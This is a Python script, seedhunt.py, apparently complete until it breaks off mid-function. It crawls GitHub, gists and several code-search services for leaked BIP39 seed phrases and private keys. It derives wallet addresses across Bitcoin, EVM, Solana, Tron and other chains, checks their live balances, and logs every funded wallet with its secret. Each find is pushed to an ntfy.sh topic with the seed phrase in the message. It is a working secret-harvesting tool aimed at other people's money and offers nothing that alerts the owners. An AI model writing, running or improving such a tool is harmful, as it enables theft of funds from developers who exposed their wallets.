#!/usr/bin/env python3
"""
seedhunt.py - autonomous hunter for leaked BIP39 seed phrases & private keys.

  python seedhunt.py discover [--max-candidates 4000]
  python seedhunt.py triage
  python seedhunt.py all
  python seedhunt.py deep
  python seedhunt.py watch [--minutes 20]
  python seedhunt.py stats

Env:
  GITHUB_TOKEN   required for GitHub code search (10 req/min) and gist lookups
  NTFY_TOPIC     optional, e.g. "my-seedhunt-9f3a" -> pushes to https://ntfy.sh/<topic>
  NTFY_TOKEN     optional bearer token for a protected ntfy topic
  SEEDHUNT_STATE optional state dir (default ./state)
"""

import argparse, hashlib, json, os, random, re, sqlite3, threading, time, urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict
from pathlib import Path

import requests

# --------------------------------------------------------------------- config

UA_BASE = "seedhunt/2.0"
TOKEN = os.environ.get("GITHUB_TOKEN") or os.environ.get("GH_TOKEN")
GH_HEAD = {"User-Agent": UA_BASE, "Accept": "application/vnd.github+json"}
if TOKEN:
    GH_HEAD["Authorization"] = f"Bearer {TOKEN}"
TEXTMATCH = dict(GH_HEAD, Accept="application/vnd.github.text-match+json")

HERE = Path(__file__).resolve().parent
STATE = Path(os.environ.get("SEEDHUNT_STATE", HERE / "state"))
STATE.mkdir(parents=True, exist_ok=True)
DB_PATH = STATE / "seedhunt.db"

GH_CODE_RPM = 9
CORE_RPM = 70 if TOKEN else 0.9
GREP_RPM = 50
RAW_WORKERS = 16
BAL_WORKERS = 8
MAX_BYTES = 2_000_000
MAX_KEYS_PER_FILE = 300
RESCAN_DAYS = 180
RECHECK_DAYS = 7
RECHECK_PER_RUN = 3000

STAR_BUCKETS = ["stars:0..2", "stars:3..10", "stars:11..50",
                "stars:51..200", "stars:201..1000", "stars:>1000"]
LANGS = ["language:JavaScript", "language:TypeScript", "language:Python",
         "language:Go", "language:Rust", "language:Solidity"]

GH_QUERIES = [
    "MNEMONIC= filename:.env", "mnemonic filename:.env",
    "mnemonic filename:.env.example", '"seedPhrase" language:TypeScript',
    '"seedPhrase" language:JavaScript', '"recovery phrase" filename:*.md',
    "filename:mnemonic.txt", "filename:seed.txt", "filename:.secret",
    "filename:wallet.json", "mnemonic filename:hardhat.config.js",
    "mnemonic filename:truffle-config.js", "mnemonic filename:deploy.js",
    "mnemonic filename:config.js", "mnemonic filename:*.yaml",
    '"MNEMONIC" filename:*.yml', "mnemonic filename:*.json",
    '"PRIVATE_KEY=" filename:.env', "filename:keystore.json",
    "filename:.env mnemonic phrase",
]

GREP_REGEXES = [
    r"mnemonic\s*[:=]\s*[\"']?(?:[a-z]{2,8}\s){11}[a-z]{2,8}",
    r"seedPhrase\s*[:=]\s*[\"']?(?:[a-z]{2,8}\s){11}",
    r"MNEMONIC\s*=\s*[\"']?(?:[a-z]{2,8}\s){11}",
    r"seed_phrase\s*[:=]", r"recovery[\s_-]?phrase\s*[:=]",
    r"(?:[a-z]{3,8}\s){23}[a-z]{3,8}",
]

GIST_TERMS = ["mnemonic", "seed phrase", "seedphrase", "bip39",
              "recovery phrase", "private key", "wallet seed"]

EVM_RPCS = {
    "ethereum": ["https://eth.llamarpc.com", "https://cloudflare-eth.com"],
    "bsc":      ["https://bsc-dataseed.binance.org"],
    "polygon":  ["https://polygon-rpc.com"],
    "base":     ["https://mainnet.base.org"],
    "arbitrum": ["https://arb1.arbitrum.io/rpc"],
}
BLOCKBOOK = {"bitcoin": "https://btc1.trezor.io",
             "litecoin": "https://ltc1.trezor.io",
             "dogecoin": "https://doge1.trezor.io"}

XPUB_SPECS = [("bitcoin", "Bip44", "BITCOIN", "44"),
              ("bitcoin", "Bip49", "BITCOIN", "49"),
              ("bitcoin", "Bip84", "BITCOIN", "84"),
              ("bitcoin", "Bip86", "BITCOIN", "86"),
              ("litecoin", "Bip84", "LITECOIN", "84"),
              ("dogecoin", "Bip44", "DOGECOIN", "44")]
ADDR_SPECS = [("evm", "Bip44", "ETHEREUM", "44", 5),
              ("solana", "Bip44", "SOLANA", "44", 3),
              ("tron", "Bip44", "TRON", "44", 3)]

PLACEHOLDER_SEEDS = {
    "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about",
    "test test test test test test test test test test test junk",
    "zoo zoo zoo zoo zoo zoo zoo zoo zoo zoo zoo wrong",
    "legal winner thank year wave sausage worth useful legal winner thank yellow",
    "letter advice cage absurd amount doctor acoustic avoid letter advice cage above",
    "all hour make first leader extend hole alien behind guard gospel lava",
    "vessel ladder alter error federal sibling chat ability sun glass valve picture",
    "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon",
    "test test test test test test test test test test test test",
}

# ------------------------------------------------------------------- plumbing

class Rate:
    def __init__(self, per_min):
        self.gap = 60.0 / per_min
        self.lock = threading.Lock()
        self.next_at = 0.0

    def wait(self):
        with self.lock:
            now = time.time()
            self.next_at = max(now, self.next_at)
            delay = self.next_at - now
            self.next_at += self.gap
        if delay > 0:
            time.sleep(delay)

GH_CODE_RATE, CORE_RATE, GREP_RATE = Rate(GH_CODE_RPM), Rate(CORE_RPM), Rate(GREP_RPM)

_print_lock = threading.Lock()
_tls = threading.local()

def say(*a):
    with _print_lock:
        print(*a, flush=True)

def sess():
    s = getattr(_tls, "s", None)
    if s is None:
        s = requests.Session()
        s.headers.update({"User-Agent": UA_BASE})
        _tls.s = s
    return s

def req(method, url, *, headers=None, rate=None, tries=4, **kw):
    r = None
    for attempt in range(tries):
        if rate:
            rate.wait()
        try:
            r = sess().request(method, url, headers=headers, timeout=30, **kw)
        except requests.RequestException:
            if attempt == tries - 1:
                raise
            time.sleep(2 ** attempt)
            continue
        if r.status_code in (403, 429):
            reset = r.headers.get("X-RateLimit-Reset")
            wait = max(2, min(70, int(reset) - int(time.time()))) if reset else 5 * (attempt + 1)
            say(f"    [rate] {r.status_code}, sleeping {wait}s")
            time.sleep(wait)
            continue
        if r.status_code >= 500:
            time.sleep(2 ** attempt)
            continue
        return r
    return r

def plain_get(url, timeout=25, limit=MAX_BYTES):
    try:
        r = sess().get(url, timeout=timeout, stream=True)
        if r.status_code != 200:
            return ""
        buf, size = [], 0
        for chunk in r.iter_content(65536):
            buf.append(chunk); size += len(chunk)
            if size > limit:
                break
        return b"".join(buf).decode("utf-8", "ignore")
    except requests.RequestException:
        return ""

def unwrap(v):
    if isinstance(v, dict):
        return v.get("raw") or v.get("value") or ""
    return v if isinstance(v, str) else ""

# ---------------------------------------------------------------- sqlite state

_db_lock = threading.RLock()
_conn = None

def db():
    global _conn
    if _conn is None:
        _conn = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=60)
        _conn.execute("PRAGMA journal_mode=WAL")
        _conn.execute("PRAGMA synchronous=NORMAL")
    return _conn

def q(sql, args=()):
    with _db_lock:
        return db().execute(sql, args).fetchall()

def x(sql, args=()):
    with _db_lock:
        cur = db().execute(sql, args)
        db().commit()
        return cur

def init_db():
    db().executescript("""
    CREATE TABLE IF NOT EXISTS candidates(
      repo TEXT, path TEXT, branch TEXT DEFAULT '', source TEXT DEFAULT '',
      query TEXT DEFAULT '', signals INTEGER DEFAULT 1, stars INTEGER DEFAULT 0,
      triaged INTEGER DEFAULT 0, added REAL DEFAULT 0, PRIMARY KEY(repo, path));
    CREATE INDEX IF NOT EXISTS idx_cand_triaged ON candidates(triaged);

    CREATE TABLE IF NOT EXISTS blobs(sha1 TEXT PRIMARY KEY, first_seen REAL, n_paths INTEGER DEFAULT 1);
    CREATE TABLE IF NOT EXISTS secrets(
      secret TEXT PRIMARY KEY, kind TEXT, paths TEXT DEFAULT '',
      placeholder INTEGER DEFAULT 0, first_seen REAL, derived INTEGER DEFAULT 0);
    CREATE TABLE IF NOT EXISTS addrs(
      key TEXT PRIMARY KEY, chain TEXT, addr TEXT, path TEXT, secret TEXT,
      checked REAL DEFAULT 0, err INTEGER DEFAULT 0);
    CREATE INDEX IF NOT EXISTS idx_addrs_checked ON addrs(checked);
    CREATE TABLE IF NOT EXISTS xpubs(
      key TEXT PRIMARY KEY, chain TEXT, path TEXT, xpub TEXT, secret TEXT,
      checked REAL DEFAULT 0, err INTEGER DEFAULT 0);
    CREATE INDEX IF NOT EXISTS idx_xpubs_checked ON xpubs(checked);
    CREATE TABLE IF NOT EXISTS balances(
      key TEXT, chain TEXT, amount REAL, PRIMARY KEY(key, chain));
    CREATE TABLE IF NOT EXISTS funded(
      key TEXT PRIMARY KEY, chain TEXT, addr TEXT, path TEXT, secret TEXT,
      bal TEXT, found REAL);
    CREATE TABLE IF NOT EXISTS queries(q TEXT PRIMARY KEY, last REAL DEFAULT 0, hits INTEGER DEFAULT 0);
    CREATE TABLE IF NOT EXISTS meta(k TEXT PRIMARY KEY, v TEXT);
    """)

def meta_get(k, d=None):
    rows = q("SELECT v FROM meta WHERE k=?", (k,))
    return rows[0][0] if rows else d

def meta_set(k, v):
    x("INSERT INTO meta(k,v) VALUES(?,?) ON CONFLICT(k) DO UPDATE SET v=excluded.v", (k, str(v)))

def src_url(repo, path):
    if repo.startswith("gist:"):
        return f"https://gist.github.com/{repo[5:]}/{path}"
    return f"https://github.com/{repo}/blob/HEAD/{path}"

# ------------------------------------------------------------------ discovery

@dataclass
class Candidate:
    repo: str
    path: str
    source: str = "github"
    query: str = ""
    branch: str = ""
    signals: int = 1
    stars: int = 0

def add_candidate(repo, path, source, query):
    x("""INSERT INTO candidates(repo,path,source,query,added) VALUES(?,?,?,?,?)
         ON CONFLICT(repo,path) DO UPDATE SET signals=signals+1""",
      (repo, path, source, query, time.time()))

def repo_meta(full_name):
    if full_name.startswith("gist:"):
        return 0, ""
    r = req("GET", f"https://api.github.com/repos/{full_name}", headers=GH_HEAD, rate=CORE_RATE)
    if r.status_code != 200:
        return 0, ""
    j = r.json()
    return j.get("stargazers_count", 0), j.get("default_branch", "") or ""

def _split_date(lo, hi):
    from datetime import date
    d0, d1 = date.fromisoformat(lo), date.fromisoformat(hi)
    if (d1 - d0).days < 2:
        return None
    return (d0 + (d1 - d0) // 2).isoformat()

def search_github_code(query, lo="2008-01-01", hi="2026-12-31", depth=0, seen=None, out=None):
    """Binary date-split so we never hit the 1000-result cap. Pages only once per window."""
    seen = seen if seen is not None else set()
    out = out if out is not None else []
    full = f"{query} pushed:{lo}..{hi}"
    r = req("GET", "https://api.github.com/search/code", headers=TEXTMATCH,
            rate=GH_CODE_RATE, params={"q": full, "per_page": 100, "page": 1})
    if r.status_code == 422:
        return out
    if r.status_code != 200:
        return out
    j = r.json()
    for it in j.get("items", []):
        key = (it["repository"]["full_name"], it["path"])
        if key in seen:
            continue
        seen.add(key)
        out.append(Candidate(key[0], key[1], "github", query))
    if j.get("total_count", 0) >= 1000 and depth < 6:
        mid = _split_date(lo, hi)
        if mid:
            search_github_code(query, lo, mid, depth + 1, seen, out)
            search_github_code(query, mid, hi, depth + 1, seen, out)
    return out

def search_grepapp(regex, pages=3):
    out = []
    for page in range(1, pages + 1):
        r = req("GET", "https://grep.app/api/search", rate=GREP_RATE,
                params={"q": regex, "page": page})
        if r.status_code != 200:
            break
        try:
            j = r.json()
        except Exception:
            break
        hits = (j.get("hits") or {}).get("hits") or []
        if not hits:
            break
        for h in hits:
            repo, path = unwrap(h.get("repo")), unwrap(h.get("path"))
            if repo and path:
                out.append(Candidate(repo, path, "grepapp", regex))
    return out

GIST_RE = re.compile(r'href="/([A-Za-z0-9_-]+)/([0-9a-f]{20,32})"')

def search_gists(term, pages=8):
    """GitHub code search does NOT index gists. This does."""
    out = []
    for p in range(1, pages + 1):
        r = req("GET", "https://gist.github.com/search", rate=GREP_RATE,
                params={"q": term, "p": p})
        if r.status_code != 200:
            break
        hits = GIST_RE.findall(r.text)
        if not hits:
            break
        for user, gid in hits:
            out.append(Candidate(f"gist:{user}", gid, "gist", term))
    return out

def search_sourcegraph(query, count=1000):
    out = []
    try:
        r = sess().get("https://sourcegraph.com/.api/search/stream",
                       params={"q": f"{query} count:{count}", "v": "V3"},
                       headers={"Accept": "text/event-stream"}, timeout=90, stream=True)
    except requests.RequestException:
        return out
    if r.status_code != 200:
        return out
    for raw in r.iter_lines(decode_unicode=True):
        if not raw or not raw.startswith("data:"):
            continue
        try:
            j = json.loads(raw[5:].strip())
        except Exception:
            continue
        items = j if isinstance(j, list) else [j]
        for it in items:
            if not isinstance(it, dict):
                continue
            path = it.get("path")
            repo = it.get("repository") or it.get("repoName") or ""
            if isinstance(repo, dict):
                repo = repo.get("name", "")
            repo = str(repo).replace("github.com/", "").replace("https://", "").strip("/")
            if repo and path:
                out.append(Candidate(repo, path, "sourcegraph", query))
    return out

def search_searchcode(query, pages=4):
    out = []
    for p in range(pages):
        r = req("GET", "https://searchcode.com/api/codesearch_I/", rate=GREP_RATE,
                params={"q": query, "p": p, "per_page": 100})
        if r.status_code != 200:
            break
        try:
            j = r.json()
        except Exception:
            break
        res = j.get("results") or []
        if not res:
            break
        for it in res:
            repo = (it.get("repo") or "").replace("https://github.com/", "").strip("/")
            path = it.get("filename") or ""
            if repo and path:
                out.append(Candidate(repo, path, "searchcode", query))
    return out

def discover(args):
    init_db()
    before = q("SELECT COUNT(*) FROM candidates")[0][0]
    say(f"[discover] github code search: {len(GH_QUERIES)} queries x {len(STAR_BUCKETS)} buckets (date-split)")
    if not TOKEN:
        say("[discover] WARNING: no GITHUB_TOKEN - code search will fail and core rate crawls")

    n = 0
    for query in GH_QUERIES:
        for bucket in STAR_BUCKETS:
            for c in search_github_code(f"{query} {bucket}"):
                add_candidate(c.repo, c.path, c.source, c.query)
                n += 1
            if q("SELECT COUNT(*) FROM candidates")[0][0] >= args.max_candidates:
                break
        say(f"    {query[:48]:<48} discovered={n}")

    say(f"[discover] grep.app regex: {len(GREP_REGEXES)} patterns")
    for rx in GREP_REGEXES:
        for c in search_grepapp(rx):
            add_candidate(c.repo, c.path, c.source, c.query)

    say(f"[discover] gists: {len(GIST_TERMS)} terms")
    for term in GIST_TERMS:
        for c in search_gists(term):
            add_candidate(c.repo, c.path, c.source, c.query)
        say(f"    {term}")

    say("[discover] sourcegraph + searchcode")
    for query in ["mnemonic filename:.env", "MNEMONIC=", "seedPhrase",
                  "recovery phrase", "private key = 0x", "bip39 mnemonic"]:
        for c in search_sourcegraph(query):
            add_candidate(c.repo, c.path, c.source, c.query)
        for c in search_searchcode(query):
            add_candidate(c.repo, c.path, c.source, c.query)

    # star enrichment for the highest-signal repos we have not enriched yet
    todo = q("""SELECT repo FROM candidates WHERE stars=0 GROUP BY repo
                ORDER BY SUM(signals) DESC LIMIT ?""", (args.star_limit,))
    say(f"[discover] star enrichment for {len(todo)} repos")
    for (full_name,) in todo:
        stars, branch = repo_meta(full_name)
        if stars or branch:
            x("UPDATE candidates SET stars=?, branch=? WHERE repo=?", (stars, branch, full_name))

    total = q("SELECT COUNT(*) FROM candidates")[0][0]
    say(f"[discover] {total} candidates total ({total - before} new) "
        f"across {q('SELECT COUNT(DISTINCT repo) FROM candidates')[0][0]} sources")
    return total

# ------------------------------------------------------------------ detection

_MN = None
WORDLIST = set()
LENS = (24, 21, 18, 15, 12)

def load_wordlist():
    global _MN, WORDLIST
    if _MN is None:
        from mnemonic import Mnemonic
        _MN = Mnemonic("english")
        WORDLIST = set(_MN.wordlist)
    return _MN

def find_phrases(text):
    mn = load_wordlist()
    toks = re.findall(r"[A-Za-z]+", text)
    if len(toks) > 60000:
        toks = toks[:60000]
    n = len(toks)
    ok = bytearray(n)
    for i, t in enumerate(toks):
        if t.lower() in WORDLIST:
            ok[i] = 1
    run = bytearray(n)
    for i in range(n):
        if ok[i]:
            run[i] = (run[i - 1] + 1) if i else 1
    found = set()
    for i in range(n):
        if not ok[i]:
            continue
        for L in LENS:
            j = i + L - 1
            if j < n and run[j] >= L:
                p = " ".join(toks[i:i + L]).lower()
                if mn.check(p):
                    found.add(p)
    return sorted(found)

HEX_RE = re.compile(r"(?<![0-9a-fA-F])(?:0x)?[0-9a-fA-F]{64}(?![0-9a-fA-F])")
WIF_RE = re.compile(r"(?<![1-9A-HJ-NP-Za-km-z])[5KL][1-9A-HJ-NP-Za-km-z]{50}(?![1-9A-HJ-NP-Za-km-z])")
B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

def b58decode(s):
    num = 0
    for ch in s:
        num = num * 58 + B58.index(ch)
    raw = num.to_bytes((num.bit_length() + 7) // 8, "big")
    pad = len(s) - len(s.lstrip("1"))
    return b"\x00" * pad + raw

def find_keys(text):
    out = set()
    for m in HEX_RE.finditer(text):
        s = m.group(0)
        s = s[2:] if s[:2].lower() == "0x" else s
        if len(set(s)) == 1:            # all-zero / all-f
            continue
        out.add(s.lower())
        if len(out) >= MAX_KEYS_PER_FILE:
            return sorted(out)
    for m in WIF_RE.finditer(text):
        try:
            payload = b58decode(m.group(0))[1:33]
        except Exception:
            continue
        if len(payload) == 32:
            out.add("wif:" + payload.hex())
        if len(out) >= MAX_KEYS_PER_FILE:
            break
    return sorted(out)

def is_placeholder(phrase):
    if phrase in PLACEHOLDER_SEEDS:
        return True
    w = phrase.split()
    return len(set(w)) == 1

# ----------------------------------------------------------------- derivation

def derive_seed(phrase, passphrase=""):
    from bip_utils import (Bip39SeedGenerator, Bip44Changes, Bip44Coins,
                           Bip49Coins, Bip84Coins, Bip86Coins)
    import bip_utils as bu
    seed = Bip39SeedGenerator(phrase).Generate(passphrase)
    addrs, xpubs = [], []

    for chain, cls_name, coin_name, purpose in XPUB_SPECS:
        try:
            cls = getattr(bu, cls_name)
            coin = getattr(bu, cls_name + "Coins") if cls_name != "Bip44" else Bip44Coins
            coin = getattr(coin, coin_name)
            acct = cls.FromSeed(seed, coin).Purpose().Coin().Account(0)
            xpub = acct.PublicKey().ToExtended()
            xpubs.append((chain, f"m/{purpose}'/0'/0'", xpub))
        except Exception:
            continue

    for chain, cls_name, coin_name, purpose, count in ADDR_SPECS:
        try:
            cls = getattr(bu, cls_name)
            coin = getattr(Bip44Coins, coin_name)
            acct = cls.FromSeed(seed, coin).Purpose().Coin().Account(0)
            for i in range(count):
                try:
                    a = acct.Change(Bip44Changes.CHAIN_EXT).AddressIndex(i).PublicKey().ToAddress()
                except Exception:
                    continue
                addrs.append((chain, f"m/{purpose}'/0'/0'/0/{i}", a))
        except Exception:
            continue
    return addrs, xpubs

def derive_raw(secret):
    """Raw 32-byte key (hex or wif:hex) -> EVM + BTC addresses. Both pubkey forms for WIF."""
    from bip_utils import EthAddrEncoder, P2PKHAddrEncoder, Secp256k1PrivateKey
    hexs = secret[4:] if secret.startswith("wif:") else secret
    raw = bytes.fromhex(hexs)
    priv = Secp256k1PrivateKey.FromBytes(raw)
    out = []
    try:
        evm = EthAddrEncoder.EncodeKey(priv.PublicKey().RawUncompressed().ToBytes())
        out.append(("evm", "raw", evm))
    except Exception:
        pass
    for form, label in ((priv.PublicKey().RawCompressed(), "btc-c"),
                        (priv.PublicKey().RawUncompressed(), "btc-u")):
        try:
            out.append(("bitcoin", f"raw/{label}", P2PKHAddrEncoder.EncodeKey(form.ToBytes())))
        except Exception:
            continue
    return out

# ------------------------------------------------------------------- balances

def set_bal(key, chain, amount):
    if amount and amount > 0:
        x("INSERT INTO balances(key,chain,amount) VALUES(?,?,?) "
          "ON CONFLICT(key,chain) DO UPDATE SET amount=excluded.amount",
          (key, chain, amount))

def bal_of(key):
    rows = q("SELECT chain, amount FROM balances WHERE key=?", (key,))
    return {c: a for c, a in rows if a and a > 0}

def _evm_chain(chain, rpcs, addrs):
    for i in range(0, len(addrs), 40):
        chunk = addrs[i:i + 40]
        for rpc in rpcs:
            try:
                payload = [{"jsonrpc": "2.0", "id": j, "method": "eth_getBalance",
                            "params": [a, "latest"]} for j, a in enumerate(chunk)]
                r = sess().post(rpc, json=payload, timeout=25)
                if r.status_code != 200:
                    continue
                res = r.json()
                if not isinstance(res, list):
                    continue
                for item in res:
                    try:
                        a = chunk[item["id"]]
                        v = int(item["result"], 16) / 1e18
                    except Exception:
                        continue
                    set_bal(f"evm:{a}", chain, v)
                break
            except requests.RequestException:
                continue

def prefetch_addrs(pairs):
    """pairs: iterable of (chain, addr)."""
    pairs = list(dict.fromkeys(pairs))
    if not pairs:
        return
    evm = [a for c, a in pairs if c == "evm"]
    btc = [a for c, a in pairs if c == "bitcoin"]
    sol = [a for c, a in pairs if c == "solana"]
    tron = [a for c, a in pairs if c == "tron"]

    jobs = []
    for chain, rpcs in EVM_RPCS.items():
        jobs.append(lambda c=chain, r=rpcs: _evm_chain(c, r, evm))
    jobs.append(lambda: _btc_bulk(btc))
    jobs.append(lambda: _sol_bulk(sol))
    jobs.append(lambda: _tron_bulk(tron))
    with ThreadPoolExecutor(BAL_WORKERS) as ex:
        list(ex.map(lambda f: f(), jobs))

def _btc_bulk(addrs):
    for i in range(0, len(addrs), 50):
        chunk = addrs[i:i + 50]
        try:
            r = sess().get("https://api.blockchair.com/bitcoin/dashboards/addresses/"
                           + ",".join(chunk), timeout=30)
            if r.status_code == 200:
                data = (r.json() or {}).get("data") or {}
                for a in chunk:
                    b = (data.get(a) or {}).get("address", {}).get("balance", 0)
                    set_bal(f"bitcoin:{a}", "bitcoin", b / 1e8)
                continue
        except requests.RequestException:
            pass
        for a in chunk:
            try:
                r = sess().get(f"https://mempool.space/api/address/{a}", timeout=20)
                if r.status_code == 200:
                    cs = r.json().get("chain_stats", {})
                    set_bal(f"bitcoin:{a}", "bitcoin",
                            (cs.get("funded_txo_sum", 0) - cs.get("spent_txo_sum", 0)) / 1e8)
            except requests.RequestException:
                continue

def _sol_bulk(addrs):
    if not addrs:
        return
    for i in range(0, len(addrs), 40):
        chunk = addrs[i:i + 40]
        payload = [{"jsonrpc": "2.0", "id": j, "method": "getBalance",
                    "params": [a]} for j, a in enumerate(chunk)]
        try:
            r = sess().post("https://api.mainnet-beta.solana.com", json=payload, timeout=25)
            if r.status_code != 200:
                continue
            for item in r.json():
                try:
                    a = chunk[item["id"]]
                    set_bal(f"solana:{a}", "solana", item["result"]["value"] / 1e9)
                except Exception:
                    continue
        except requests.RequestException:
            continue

def _tron_bulk(addrs):
    def one(a):
        try:
            r = sess().get(f"https://api.trongrid.io/v1/accounts/{a}", timeout=20)
            if r.status_code == 200:
                bal = (r.json().get("data") or [{}])[0].get("balance", 0)
                set_bal(f"tron:{a}", "tron", bal / 1e6)
        except requests.RequestException:
            pass
    with ThreadPoolExecutor(BAL_WORKERS) as ex:
        list(ex.map(one, addrs))

def prefetch_xpubs(rows):
    """rows: iterable of (key, chain, xpub)."""
    def one(key, chain, xpub):
        base = BLOCKBOOK.get(chain)
        if not base:
            return
        try:
            r = sess().get(f"{base}/api/v2/xpub/{xpub}", params={"details": "basic"}, timeout=30)
            if r.status_code != 200:
                return
            bal = int(r.json().get("balance", 0) or 0) / 1e8
            set_bal(key, chain, bal)
        except (requests.RequestException, ValueError):
            return
    rows = list(rows)
    with ThreadPoolExecutor(BAL_WORKERS) as ex:
        list(ex.map(lambda t: one(*t), rows))

# --------------------------------------------------------------------- fetch

def fetch_raw(repo, path, branch=None):
    if repo.startswith("gist:"):
        r = req("GET", f"https://api.github.com/gists/{path}", headers=GH_HEAD, rate=CORE_RATE)
        if r.status_code != 200:
            return ""
        files = (r.json().get("files") or {})
        return "\n".join(plain_get(f["raw_url"], timeout=20)
                         for f in files.values() if f.get("raw_url"))
    qp = urllib.parse.quote(path)
    for b in dict.fromkeys([branch] if branch else ["main", "master"]):
        txt = plain_get(f"https://raw.githubusercontent.com/{repo}/{b}/{qp}")
        if txt:
            return txt
    return ""

# --------------------------------------------------------------------- triage

def _record_secret(secret, kind, path, placeholder):
    x("""INSERT INTO secrets(secret,kind,paths,placeholder,first_seen) VALUES(?,?,?,?,?)
         ON CONFLICT(secret) DO UPDATE SET paths=paths||','||? """,
      (secret, kind, path, placeholder, time.time(), path))

def triage(args):
    init_db()
    load_wordlist()
    rows = q("SELECT repo,path,branch FROM candidates WHERE triaged=0 LIMIT ?",
             (getattr(args, "batch", 20000),))
    if not rows:
        say("[triage] nothing new")
        return []
    say(f"[triage] fetching {len(rows)} candidate files")

    done = [0]
    lock = threading.Lock()

    def work(row):
        repo, path, branch = row
        try:
            text = fetch_raw(repo, path, branch)
        except Exception:
            return repo, path, None, [], []
        if not text:
            return repo, path, None, [], []
        h = hashlib.sha1(text.encode("utf-8", "ignore")).hexdigest()
        return repo, path, h, find_phrases(text), find_keys(text)

    with ThreadPoolExecutor(RAW_WORKERS) as ex:
        for fut in as_completed([ex.submit(work, r) for r in rows]):
            repo, path, h, phrases, keys = fut.result()
            with lock:
                done[0] += 1
                if done[0] % 250 == 0:
                    say(f"    ...{done[0]}/{len(rows)}")

            if h is None:
                # transient failure: leave triaged=0 so we retry next run
                continue

            known = q("SELECT sha1 FROM blobs WHERE sha1=?", (h,))
            label = f"{repo}/{path}"
            if known:
                x("UPDATE blobs SET n_paths=n_paths+1 WHERE sha1=?", (h,))
            else:
                x("INSERT INTO blobs(sha1,first_seen) VALUES(?,?)", (h, time.time()))
                for p in phrases:
                    _record_secret(p, "seed", label, 1 if is_placeholder(p) else 0)
                    say(f"    SEED  {label}")
                for k in keys:
                    _record_secret(k, "key", label, 0)
            x("UPDATE candidates SET triaged=1 WHERE repo=? AND path=?", (repo, path))

    new_secrets = q("SELECT secret,kind,placeholder FROM secrets WHERE derived=0 LIMIT 20000")
    say(f"[triage] {len(new_secrets)} new secrets to derive")

    addrs, xpubs = [], []
    for secret, kind, placeholder in new_secrets:
        try:
            if kind == "key":
                got = derive_raw(secret)
                for chain, path, addr in got:
                    addrs.append((chain, addr, path, secret))
            else:
                got_a, got_x = derive_seed(secret, "")
                for chain, path, addr in got_a:
                    addrs.append((chain, addr, path, secret))
                for chain, path, xpub in got_x:
                    xpubs.append((f"xpub:{chain}:{path}:{xpub}", chain, path, xpub, secret))
        except Exception:
            pass
        x("UPDATE secrets SET derived=1 WHERE secret=?", (secret,))

    for chain, addr, path, secret in addrs:
        x("""INSERT INTO addrs(key,chain,addr,path,secret) VALUES(?,?,?,?,?)
             ON CONFLICT(key) DO NOTHING""", (f"{chain}:{addr}", chain, addr, path, secret))
    for key, chain, path, xpub, secret in xpubs:
        x("""INSERT INTO xpubs(key,chain,path,xpub,secret) VALUES(?,?,?,?,?)
             ON CONFLICT(key) DO NOTHING""", (key, chain, path, xpub, secret))

    check_pending()
    report()
    return []

def check_pending(limit=RECHECK_PER_RUN):
    now = time.time()
    due_a = q("""SELECT key,chain,addr,path,secret FROM addrs
                 WHERE checked < ? ORDER BY checked ASC LIMIT ?""",
              (now - RECHECK_DAYS * 86400, limit))
    due_x = q("""SELECT key,chain,xpub,path,secret FROM xpubs
                 WHERE checked < ? ORDER BY checked ASC LIMIT ?""",
              (now - RECHECK_DAYS * 86400, limit))
    say(f"[check] {len(due_a)} addresses, {len(due_x)} xpubs due")

    prefetch_addrs([(c, a) for _k, c, a, _p, _s in due_a])
    prefetch_xpubs([(k, c, xp) for k, c, xp, _p, _s in due_x])

    for key, chain, addr, path, secret in due_a:
        record_funded(key, chain, addr, path, secret)
        x("UPDATE addrs SET checked=? WHERE key=?", (now, key))
    for key, chain, xpub, path, secret in due_x:
        record_funded(key, chain, f"xpub:{xpub[:14]}...", path, secret)
        x("UPDATE xpubs SET checked=? WHERE key=?", (now, key))

def record_funded(key, chain, addr, path, secret):
    bal = bal_of(key)
    if not bal:
        return False
    if q("SELECT 1 FROM funded WHERE key=?", (key,)):
        return False
    desc = ", ".join(f"{v:.8f} {c}" for c, v in bal.items())
    x("""INSERT INTO funded(key,chain,addr,path,secret,bal,found) VALUES(?,?,?,?,?,?,?)""",
      (key, chain, addr, path, secret, desc, time.time()))
    say(f"    FUNDED  {desc}  {addr}")
    notify(f"FUNDED {desc}", f"{chain} {addr}\n{desc}\n"
                             f"seed: {secret[:80]}\n{src_url(*path.split('/', 1))}",
           priority="urgent", click=src_url(*path.split("/", 1)) if "/" in path else None)
    return True

def report():
    funded = q("SELECT bal,chain,addr,path,secret FROM funded ORDER BY found DESC LIMIT 50")
    total = q("SELECT COUNT(*) FROM funded")[0][0]
    print("\n" + "=" * 72)
    print(f"FUNDED ({total})")
    print("=" * 72)
    for bal, chain, addr, path, secret in funded:
        print(f"\n  {bal}   [{chain}]  {addr}")
        print(f"  seed {secret[:100]}")
        print(f"  src  {path}")
    if not funded:
        print("\n  nothing funded yet.")

# ------------------------------------------------------------------ notify

def notify(title, msg, priority="default", click=None):
    topic = os.environ.get("NTFY_TOPIC")
    if not topic:
        return
    h = {"Title": title[:120], "Priority": priority, "Tags": "seedling", "Markdown": "yes"}
    if click:
        h["Click"] = click
    if os.environ.get("NTFY_TOKEN"):
        h["Authorization"] = f"Bearer {os.environ['NTFY_TOKEN']}"
    try:
        sess().post(f"https://ntfy.sh/{topic}", data=msg.encode()[:3900], headers=h, timeout=10)
    except requests.RequestException as e:
        print("notify failed:", e)

# --------------------------------------------------------------------- deep

def deep(args):
    import subprocess
    init_db()
    repos = [r for (r,) in q("SELECT DISTINCT repo FROM candidates WHERE repo NOT LIKE 'gist:%'")]
    say(f"[deep] trufflehog history scan on {len(repos)} repos")
    found = {}
    for repo in repos:
        try:
            p = subprocess.run(["trufflehog", "git", f"https://github.com/{repo}",
                                "--json", "--no-update"],
                               capture_output=True, text=True, timeout=900)
        except FileNotFoundError:
            say("[deep] trufflehog not on PATH")
            return
        except subprocess.TimeoutExpired:
            say(f"    timeout {repo}")
            continue
        for line in p.stdout.splitlines():
            try:
                j = json.loads(line)
            except Exception:
                continue
            for ph in find_phrases(j.get("Raw") or ""):
                found.setdefault(ph, set()).add(repo)
        say(f"    {repo}")
    for ph, repos_ in found.items():
        for r in repos_:
